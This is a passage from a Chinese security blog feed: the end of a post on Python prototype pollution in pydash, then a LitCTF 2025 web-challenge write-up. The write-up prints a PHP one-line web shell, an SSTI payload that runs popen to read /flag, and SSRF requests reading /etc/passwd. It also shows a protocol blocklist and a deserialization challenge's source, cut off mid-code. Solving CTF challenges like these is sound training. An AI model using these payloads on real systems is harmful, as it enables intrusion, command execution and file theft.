cover</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            target = target[<span class="built_in">int</span>(key)]</span><br><span class="line">            _failed = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            _failed = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> _failed:</span><br><span class="line">            <span class="keyword">raise</span> TypeError(<span class="string">f&quot;Unable to update object at index <span class="subst">&#123;key!r&#125;</span>. <span class="subst">&#123;exc&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>â€‹è¿™ä¸ª  <code>update_with</code>  å‡½æ•°çš„ä½œç”¨å¯ä»¥æ€»ç»“å¦‚ä¸‹ï¼š</p><ol><li><strong>æ›´æ–°åµŒå¥—å¯¹è±¡</strong>ï¼šå‡½æ•°ç”¨äºåœ¨ç»™å®šçš„  <code>obj</code> ï¼ˆä¸€ä¸ªåˆ—è¡¨æˆ–å­—å…¸ï¼‰ä¸­æŒ‰ç…§  <code>path</code>  æŒ‡å®šçš„è·¯å¾„æ›´æ–°ä¸€ä¸ªå€¼ã€‚</li><li><strong>è·¯å¾„å¤„ç†</strong>ï¼š <code>path</code>  å¯ä»¥æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²æˆ–é”®çš„åˆ—è¡¨ï¼Œæè¿°äº†è¦ä¿®æ”¹çš„å¯¹è±¡è·¯å¾„ã€‚</li><li><strong>è‡ªå®šä¹‰æ›´æ–°</strong>ï¼š <code>updater</code>  æ˜¯ä¸€ä¸ªå¯è°ƒç”¨å¯¹è±¡ï¼Œå®ƒç”¨äºç”Ÿæˆæ›´æ–°åçš„å€¼ã€‚å¦‚æœ  <code>updater</code>  ä¸æ˜¯ä¸€ä¸ªå¯è°ƒç”¨å¯¹è±¡ï¼Œå®ƒä¼šè¢«è½¬æ¢ä¸ºä¸€ä¸ªè¿”å›å¸¸é‡å€¼çš„å‡½æ•°ã€‚</li><li><strong>è‡ªå®šä¹‰å€¼ç”Ÿæˆ</strong>ï¼š <code>customizer</code>  æ˜¯ä¸€ä¸ªå¯é€‰çš„å¯è°ƒç”¨å¯¹è±¡ï¼Œå®ƒç”¨äºè‡ªå®šä¹‰è·¯å¾„ä¸Šçš„å¯¹è±¡å€¼ã€‚å¦‚æœ  <code>customizer</code>  è¿”å›  <code>None</code> ï¼Œåˆ™è·¯å¾„ä¸Šçš„å¯¹è±¡å€¼ç”±å‡½æ•°æœ¬èº«å¤„ç†ã€‚</li><li><strong>è‡ªå®šä¹‰å‚æ•°</strong>ï¼š <code>customizer</code>  è¢«è°ƒç”¨æ—¶æ¥æ”¶ä¸‰ä¸ªå‚æ•°ï¼š <code>(nested_value, key, nested_object)</code> ã€‚</li><li><strong>é€’å½’åˆ›å»ºè·¯å¾„</strong>ï¼šå‡½æ•°é€’å½’åœ°éå†  <code>path</code> ï¼Œåˆ›å»ºè·¯å¾„ä¸Šçš„å¯¹è±¡ï¼Œå¦‚æœè·¯å¾„ä¸Šçš„å¯¹è±¡ä¸å­˜åœ¨ï¼Œåˆ™ä½¿ç”¨  <code>default_factory</code>  åˆ›å»ºã€‚</li><li><strong>æ›´æ–°æœ€ç»ˆå€¼</strong>ï¼šéå†å®Œæˆåï¼Œä½¿ç”¨  <code>updater</code>  æ›´æ–°è·¯å¾„æœ€ç»ˆä½ç½®ä¸Šçš„å€¼ã€‚</li><li><strong>é”™è¯¯å¤„ç†</strong>ï¼šå¦‚æœåœ¨è·å–æˆ–è®¾ç½®è·¯å¾„ä¸Šçš„å€¼æ—¶é‡åˆ°  <code>TypeError</code> ï¼Œå‡½æ•°ä¼šå°è¯•ä½¿ç”¨æ•´æ•°ç´¢å¼•è®¿é—®ï¼Œå¦‚æœä»ç„¶å¤±è´¥ï¼Œåˆ™æŠ›å‡ºå¼‚å¸¸ã€‚</li><li><strong>åŸåœ°ä¿®æ”¹</strong>ï¼š <code>obj</code>  æ˜¯ç›´æ¥åœ¨åŸå¯¹è±¡ä¸Šè¿›è¡Œä¿®æ”¹çš„ï¼Œè€Œä¸æ˜¯è¿”å›ä¸€ä¸ªæ–°çš„å¯¹è±¡ã€‚</li><li><strong>è¿”å›å€¼</strong>ï¼šå‡½æ•°è¿”å›ä¿®æ”¹åçš„  <code>obj</code> ã€‚</li></ol><p>â€‹ç®€è€Œè¨€ä¹‹ï¼Œ <code>update_with</code>  å‡½æ•°æ ¹æ®æä¾›çš„è·¯å¾„ï¼Œä½¿ç”¨è‡ªå®šä¹‰é€»è¾‘é€’å½’åœ°åˆ›å»ºæˆ–æ›´æ–°ä¸€ä¸ªåµŒå¥—çš„åˆ—è¡¨æˆ–å­—å…¸ä¸­çš„å€¼ï¼Œå¹¶åœ¨è·¯å¾„çš„æœ€ç»ˆä½ç½®åº”ç”¨ä¸€ä¸ªæ›´æ–°å‡½æ•°ã€‚</p><h1 id="å‚è€ƒæ–‡ç« "><a class="markdownIt-Anchor" href="#å‚è€ƒæ–‡ç« ">#</a> å‚è€ƒæ–‡ç« ï¼š</h1><h2 id="åŸºç¡€èµ„æ–™"><a class="markdownIt-Anchor" href="#åŸºç¡€èµ„æ–™">#</a> åŸºç¡€èµ„æ–™</h2><p><span class="exturl" data-url="aHR0cHM6Ly9wYXp1cmlzLmNuLzIwMjMvMDcvMjcvUHl0aG9uJUU1JThFJTlGJUU1JTlFJThCJUU5JTkzJUJFJUU2JUIxJUExJUU2JTlGJTkzLw==">Python åŸå‹é“¾æ±¡æŸ“</span></p><p><strong><span class="exturl" data-url="aHR0cHM6Ly90dHRhbmcuY29tL2FyY2hpdmUvMTg3Ni8jdG9jX180">Python åŸå‹é“¾æ±¡æŸ“å˜ä½“ (prototype-pollution-in-python)</span></strong></p><p><span class="exturl" data-url="aHR0cHM6Ly9mdXJpbmEub3JnLmNuLzIwMjMvMTIvMTgvcHJvdG90eXBlLXBvbGx1dGlvbi1pbi1weWRhc2gtY3RmLyMlRTQlQkIlQTMlRTclQTAlODElRTglQjAlODMlRTglQUYlOTU=">Pydash åŸå‹é“¾æ±¡æŸ“</span></p><h2 id="åšé¢˜å‚è€ƒ"><a class="markdownIt-Anchor" href="#åšé¢˜å‚è€ƒ">#</a> åšé¢˜å‚è€ƒï¼š</h2><p><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMTQ2MjA/dGltZV9fMTMxMT1HcUFoWUswS0JLOEQlMkZEMGx0ZEdRNTVNRFJvdEl0ZUQ=">ä» CISCN2024 çš„ sanic å¼•å‘å¯¹ python â€œåŸå‹é“¾â€ çš„æ±¡æŸ“æŒ–æ˜</span></p><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vZ3huZ3huZ3huL3AvMTgyMDUyMzU=">CISCN2024-WEB-Sanic gxngxngxn    </span></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;pythonåŸå‹é“¾æ±¡æŸ“&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#pythonåŸå‹é“¾æ±¡æŸ“&quot;&gt;#&lt;/a&gt; python åŸå‹é“¾æ±¡æŸ“&lt;/h1&gt;
&lt;p&gt;â€‹		åé¢ä¼šæœ‰è·Ÿç€ Article_kelp æ…¢æ…¢æ“ä½œçš„ï¼Œå‰é¢å…ˆé¢å‘é¢˜ç›®å­¦ä¹ ã€‚&lt;/p&gt;</summary>
      
    
    
    
    <category term="Webç‹—çš„è‡ªæˆ‘å®‰æ…°" scheme="http://blog.g01den.top/categories/Web/"/>
    
    
    <category term="Web" scheme="http://blog.g01den.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>ã€2025ã€‘LitCTF</title>
    <link href="http://blog.g01den.top/posts/a4378bd0.html"/>
    <id>http://blog.g01den.top/posts/a4378bd0.html</id>
    <published>2025-12-25T13:55:55.000Z</published>
    <updated>2026-02-05T09:50:10.634Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web"><a class="markdownIt-Anchor" href="#web">#</a> Web</h1><h2 id="litctf-2025easy_file"><a class="markdownIt-Anchor" href="#litctf-2025easy_file">#</a> [LitCTF 2025]easy_file</h2><p>â€‹ç™»å½•æ¡†å¼±å¯†ç çˆ†ç ´ä¸º admin:passwordï¼Œä¹‹åè·³è½¬åˆ°æ–‡ä»¶ä¸Šä¼ ç‚¹ï¼Œåªèƒ½ä¸Šä¼ å¤´åƒï¼Œå¹¶ä¸” php è¢«è¿‡æ»¤ï¼ŒçŸ­æ ‡ç­¾ç»•è¿‡ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>â€‹js é‡Œé¢å­˜åœ¨æç¤ºï¼Œè¯´ file æŸ¥çœ‹å¤´åƒï¼Œä¼°è®¡æ˜¯å¯ä»¥æ–‡ä»¶åŒ…å«ã€‚ç›´æ¥ä¼ ï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/admin.php?file=uploads/a.jpg<span class="built_in">&amp;</span>cmd=tac f*</span><br></pre></td></tr></table></figure><p>â€‹è¿›è¡Œ rceã€‚</p><h2 id="litctf-2025nest_js"><a class="markdownIt-Anchor" href="#litctf-2025nest_js">#</a> [LitCTF 2025]nest_js</h2><p>â€‹ç™»å½•æ¡†å¼±å¯†ç çˆ†ç ´è¿˜æ˜¯ admin:passwordï¼Œç™»å½•ç›´æ¥å¾—åˆ° flag</p><h2 id="litctf-2025æ˜Ÿæ„¿ä¿¡ç®±"><a class="markdownIt-Anchor" href="#litctf-2025æ˜Ÿæ„¿ä¿¡ç®±">#</a> [LitCTF 2025] æ˜Ÿæ„¿ä¿¡ç®±</h2><p>â€‹wappalyzer æ’ä»¶çœ‹åˆ°æ˜¯ flask æ¡†æ¶ï¼Œ è¾“å…¥ asd çš„æ—¶å€™å›æ˜¾ asdï¼Œå¯èƒ½æ˜¯ sstiï¼Œè¾“å…¥ <code>&#123;%print(123)%&#125;</code>  æˆåŠŸè¾“å‡º 123ï¼Œå¼€å§‹æµ‹è¯•ã€‚</p><p>â€‹ <code>&#123;&#123; &#125;&#125;</code>  è¢«è¿‡æ»¤äº†ï¼Œä½†æ˜¯ <code>&#123;% %&#125;</code>  æ²¡æœ‰è¢«è¿‡æ»¤å°è¯•ä¸‹è¿™ä¸ª payloadï¼Œè¿™ä¸ªåŸºç¡€ payload æ¯”è¾ƒå¸¸è§„ï¼Œç”šè‡³é‡Œé¢æ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="comment">% print().__class__.__base__.__subclasses__()[n].__init__.__globals__[&#x27;popen&#x27;](&quot;base64 /flag&quot;).read() %&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹æŠŠ <code>__subclasses__()[n]</code>  é‡Œçš„ n ç”¨ burp çˆ†ç ´ï¼Œæœ€å¥½å‘ç° 137 è¯»åˆ° flagï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="comment">% print().__class__.__base__.__subclasses__()[137].__init__.__globals__[&#x27;popen&#x27;](&quot;base64 /flag&quot;).read() %&#125;</span></span><br></pre></td></tr></table></figure><h2 id="litctf-2025easy_signin"><a class="markdownIt-Anchor" href="#litctf-2025easy_signin">#</a> [LitCTF 2025]easy_signin</h2><p>â€‹æ‰«åå°ï¼Œæ‰«åˆ°äº† <code>login.html</code>  è®¿é—®æ˜¯ä¸ªç™»å½•é¡µé¢ï¼Œè¯»æºç å‘ç°äº†ä¸€ä¸ªç‚¹ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> secretKey = <span class="string">&#x27;easy_signin&#x27;</span>;  </span><br><span class="line"><span class="keyword">const</span> sign = <span class="title class_">CryptoJS</span>.<span class="title class_">MD5</span>(shortMd5User + shortMd5Pass + timestamp + secretKey).<span class="title function_">toString</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> response = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&#x27;login.php&#x27;</span>, &#123;</span><br><span class="line">        <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">        <span class="attr">headers</span>: &#123;</span><br><span class="line">            <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;X-Sign&#x27;</span>: sign  </span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">body</span>: <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(&#123;</span><br><span class="line">            <span class="attr">username</span>: md5Username,   </span><br><span class="line">            <span class="attr">password</span>: md5Password,   </span><br><span class="line">            <span class="attr">timestamp</span>: timestamp</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><p>â€‹è´¦å·å¯†ç æ˜¯ md5 åŠ å¯†çš„ï¼Œburp æŠ“åŒ…ç™»å½•ï¼Œç»™ user æ”¹æˆ admin çš„ md5ï¼š <code>21232f297a57a5a743894a0e4a801fc3</code> ï¼Œç„¶åçˆ†ç ´å¯†ç ï¼Œè®°å¾—å¯†ç ä¹Ÿè¦ md5 åŠ å¯†ï¼Œå¯†ç æ²¡ç»“æœï¼Œè‡³å°‘æˆ‘å­—å…¸æ²¡å‡ºæ¥ï¼Œé‚£å°±æ¢ä¸ªæ€è·¯ï¼Œå‰é¢å‘ç°ä¸€ä¸ªæ–‡ä»¶å¯ä»¥è®¿é—®ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;api.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œ api.js åº”è¯¥æ˜¯æœåŠ¡å™¨æœ¬åœ°çš„ï¼Œè®¿é—®å¾—åˆ°å¦‚ä¸‹å†…å®¹ï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/api/sys/urlcode.php?url=</span><br></pre></td></tr></table></figure><p>â€‹æ­£å¥½æ‰«ç›®å½•çš„æ—¶å€™å­˜åœ¨ /apiï¼Œé‚£ä¹ˆå¯ä»¥è¯•è¯•çœ‹è¿™ä¸ªèƒ½å¹²å•¥ï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/api/sys/urlcode.php?url=http://www.baidu.com</span><br></pre></td></tr></table></figure><p>â€‹å¯ä»¥è¿›è¡Œ ssrfï¼ŒæˆåŠŸè®¿é—®åˆ°äº†ç™¾åº¦ï¼Œå†å›å»çœ‹ç™»å½•é¡µæºç ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (result.<span class="property">code</span> === <span class="number">200</span>) &#123;</span><br><span class="line">                    <span class="title function_">alert</span>(<span class="string">&#x27;ç™»å½•æˆåŠŸï¼&#x27;</span>);</span><br><span class="line">                    <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = <span class="string">&#x27;dashboard.php&#x27;</span>; </span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œå‘ç°ç™»å½•æˆåŠŸåˆ™è·³è½¬ <code>dashboard.php</code> ï¼Œä½†æ˜¯è®¿é—®å¾—åˆ°çš„æ˜¯ï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/api/sys/urlcode.php?url=http://127.0.0.1/dashboard.php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="params">#</span>ç»“æœï¼š</span><br><span class="line">çœ‹ä¸è§å“¦</span><br></pre></td></tr></table></figure><p>â€‹è¯•å›¾ä½¿ç”¨ <code>php://filter</code>  å‘ç°ç›´æ¥ <code>ç¦æ­¢è®¿é—®ï¼šä¸å…è®¸ä½¿ç”¨ php:// åè®®</code> ï¼Œç”¨ file ä¸ä¼šï¼Œè¯•å›¾è®¿é—®ä¸‹ <code>/etc/passwd</code>  æˆåŠŸè®¿é—®åˆ°ï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/api/sys/urlcode.php?url=file:///etc/passwd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root:x:0:0:root:/root:/bin/ash</span><br><span class="line">bin:x:1:1:bin:/bin:/sbin/nologin</span><br><span class="line">daemon:x:2:2:daemon:/sbin:/sbin/nologin</span><br><span class="line">adm:x:3:4:adm:/var/adm:/sbin/nologin</span><br><span class="line">lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin</span><br><span class="line">sync:x:5:0:sync:/sbin:/bin/sync</span><br></pre></td></tr></table></figure><p>â€‹ä¹‹åå°±æ˜¯ <code>dashboard.php</code> ï¼Œç”¨æ’ä»¶å‘ç°æ˜¯ nginx æ¡†æ¶ï¼Œæ¨æµ‹ç›®å½•æ˜¯ <code>/var/www/html</code> ï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/api/sys/urlcode.php?url=file:///var/www/html/dashboard.php</span><br><span class="line"></span><br><span class="line">çœ‹ä¸è§å“¦</span><br></pre></td></tr></table></figure><p>â€‹emmï¼Œåº”è¯¥æ˜¯è¿™ä¸ªæ–‡ä»¶çš„é—®é¢˜ï¼Œæ¢ä¸ª php æ–‡ä»¶å°±èƒ½çœ‹åˆ°ä¿¡æ¯ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">/api/sys/urlcode.php?url=file:<span class="comment">///var/www/html/api/sys/urlcode.php </span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$url</span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$forbidden_protocols</span> = [<span class="string">&#x27;ftp://&#x27;</span>, <span class="string">&#x27;php://&#x27;</span>, <span class="string">&#x27;zlib://&#x27;</span>, <span class="string">&#x27;data://&#x27;</span>, <span class="string">&#x27;glob://&#x27;</span>, <span class="string">&#x27;phar://&#x27;</span>, <span class="string">&#x27;ssh2://&#x27;</span>, <span class="string">&#x27;rar://&#x27;</span>, <span class="string">&#x27;ogg://&#x27;</span>, <span class="string">&#x27;expect://&#x27;</span>];</span><br><span class="line">    <span class="variable">$protocol_block</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$forbidden_protocols</span> <span class="keyword">as</span> <span class="variable">$proto</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$url</span>, <span class="variable">$proto</span>) === <span class="number">0</span>) &#123;  </span><br><span class="line">            <span class="variable">$protocol_block</span> = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$log_block</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$url</span>, <span class="string">&#x27;.log&#x27;</span>) !== <span class="literal">false</span>;  </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$protocol_block</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ç¦æ­¢è®¿é—®ï¼šä¸å…è®¸ä½¿ç”¨ <span class="subst">&#123;$proto&#125;</span> åè®®&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="variable">$log_block</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ç¦æ­¢è®¿é—®ï¼šURL åŒ…å« .log&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$url</span>, <span class="string">&#x27;login.php&#x27;</span>) !== <span class="literal">false</span> || <span class="title function_ invoke__">strpos</span>(<span class="variable">$url</span>, <span class="string">&#x27;dashboard.php&#x27;</span>) !== <span class="literal">false</span> || <span class="title function_ invoke__">strpos</span>(<span class="variable">$url</span>, <span class="string">&#x27;327a6c4304ad5938eaf0efb6cc3e53dc.php&#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;çœ‹ä¸è§å“¦&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;b&gt;&quot;</span>.<span class="variable">$url</span>.<span class="string">&quot; çš„å¿«ç…§å¦‚ä¸‹ï¼š&lt;/b&gt;&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">curl</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>â€‹å‘ç°ç¦æ­¢è®¿é—®ï¼š <code>327a6c4304ad5938eaf0efb6cc3e53dc.php</code>  å’Œ <code>dashboard.php</code> ã€‚ã€‚ã€‚å¥½æ°”å•Šã€‚</p><p>â€‹è¿™é‡Œç›´æ¥è®¿é—®ä¸‹è¿™ä¸ªä¹±ç ä¸€æ ·çš„æ–‡ä»¶çœ‹çœ‹ï¼Œæ‹¿åˆ° flagï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;d1bec3ad-9f2a-426f-9794-aed548ec03db&#125;</span><br></pre></td></tr></table></figure><h2 id="litctf-2025å›ã®åã¯"><a class="markdownIt-Anchor" href="#litctf-2025å›ã®åã¯">#</a> [LitCTF 2025] å›ã®åã¯</h2><p>â€‹è¿™ä¸ªé¢˜æˆ‘å°±è´´ä¸ªå¤§ä½¬çš„ payload å§</p><p>â€‹ååºåˆ—åŒ– pop é“¾çš„é¢˜ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="string">&quot;&quot;</span>, <span class="string">&#x27;die(`/readflag`);&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Taki</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$musubi</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$magic</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;musubi = <span class="variable">$data</span>[<span class="string">&#x27;musubi&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;magic = <span class="variable">$data</span>[<span class="string">&#x27;magic&#x27;</span>];</span><br><span class="line">        <span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;musubi)();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>,<span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line">        (<span class="keyword">new</span> <span class="variable">$args</span>[<span class="number">0</span>](<span class="variable">$args</span>[<span class="number">1</span>]))-&gt;&#123;<span class="variable language_">$this</span>-&gt;magic&#125;();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mitsuha</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$memory</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$thread</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;memory.<span class="variable language_">$this</span>-&gt;thread;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">KatawareDoki</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$soul</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$kuchikamizake</span>;</span><br><span 